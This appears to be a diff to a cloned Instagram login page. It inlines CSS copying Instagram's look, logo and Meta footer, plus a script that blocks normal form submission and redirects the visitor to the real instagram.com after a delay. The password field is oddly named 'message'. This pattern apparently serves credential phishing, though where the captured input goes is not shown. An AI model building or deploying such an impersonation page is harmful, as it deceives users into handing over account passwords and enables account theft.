@@ -6,8 +6,300 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Login • Instagram</title>
-    <link rel="stylesheet" href="style.css">
     <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(250, 250, 250, 0.926);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 1;
+            visibility: visible;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .loaded .loader-overlay {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .loader {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: 2px solid #dbdbdb;
+            border-top-color: #262626;
+            animation: spin 0.8s infinite linear;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 3rem;
+            flex-grow: 1;
+        }
+
+        .box {
+            max-width: 350px;
+            width: 100%;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            margin-bottom: 10px;
+            padding: 10px 0 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .heading {
+            margin: 36px auto 12px;
+            height: 51px;
+            width: 175px;
+            background-image: url("https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg");
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            padding: 0 40px;
+            box-sizing: border-box;
+        }
+
+        .field {
+            margin: 6px 0;
+            position: relative;
+            font-size: 12px;
+            width: 100%;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 8px 6px 8px;
+            font-size: 12px;
+            background: #fafafa;
+            border-radius: 3px;
+            border: 1px solid #dbdbdb;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border: 1px solid #a8a8a8;
+        }
+
+        label {
+            position: absolute;
+            pointer-events: none;
+            left: 9px;
+            top: 50%;
+            transform: translateY(-50%);
+            transition: all ease-out 0.1s;
+            font-size: 12px;
+            color: #737373;
+            line-height: 1;
+        }
+
+        input::placeholder {
+            visibility: hidden;
+        }
+
+        input:not(:placeholder-shown) + label,
+        input:focus + label {
+            top: 10px;
+            font-size: 10px;
+            transform: translateY(0);
+        }
+
+        input:not(:placeholder-shown),
+        input:focus {
+            padding-top: 18px;
+            padding-bottom: 4px;
+        }
+
+        .login-button {
+            width: 100%;
+            margin-top: 8px;
+            padding: 7px 16px;
+            background-color: #0095f6;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .login-button:active {
+            background-color: #1877f2;
+        }
+
+        .separator {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #737373;
+            margin: 15px 0;
+            width: 100%;
+        }
+
+        .separator .line {
+            height: 1px;
+            width: 40%;
+            background-color: #dbdbdb;
+        }
+
+        .separator p {
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .other {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .fb-login-btn {
+            margin: 8px 0;
+            border: 0;
+            cursor: pointer;
+            font-size: 14px;
+            color: #385185;
+            font-weight: 600;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fb-login-btn img {
+            margin-right: 8px;
+        }
+
+        .fb-login-btn a {
+            text-decoration: none;
+            color: #385185;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: #003569;
+            font-weight: 400;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        .signup {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .signup-box p {
+            font-size: 14px;
+            margin: 15px;
+        }
+
+        .get {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 10px;
+            color: #262626;
+        }
+
+        .apps {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+        }
+
+        .apps img {
+            height: 40px;
+        }
+
+        .footer {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 40px;
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 8px;
+            margin-bottom: 5px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .copyright {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            color: #737373;
+            margin-top: 15px;
+            margin-bottom: 30px;
+            gap: 10px;
+        }
+
+        .Language {
+            background: transparent;
+            border: none;
+            color: #737373;
+            font-size: 12px;
+        }
+
+        #show-password-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            color: #262626;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
 </head>
 
 <body>
@@ -134,6 +426,42 @@
         </select> © 2024 Instagram from Meta
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        function redirectToInstagram(event) {
+            event.preventDefault(); 
+            setTimeout(function () {
+                window.location.href = "https://www.instagram.com/";
+            }, 1000);
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            const showPasswordBtn = document.getElementById('show-password-btn');
+            const passwordField = document.getElementById('message');
+
+            passwordField.addEventListener('input', function () {
+                if (passwordField.value.length > 0) {
+                    showPasswordBtn.style.display = 'block';
+                } else {
+                    showPasswordBtn.style.display = 'none';
+                }
+            });
+
+            showPasswordBtn.addEventListener('click', function () {
+                if (passwordField.type === 'password') {
+                    passwordField.type = 'text';
+                    showPasswordBtn.textContent = 'Hide';
+                } else {
+                    passwordField.type = 'password';
+                    showPasswordBtn.textContent = 'Show';
+                }
+            });
+
+            window.addEventListener('load', () => {
+                setTimeout(() => {
+                    document.body.classList.add('loaded');
+                }, 800); 
+            });
+        });
+    </script>
 </body>
 </html>
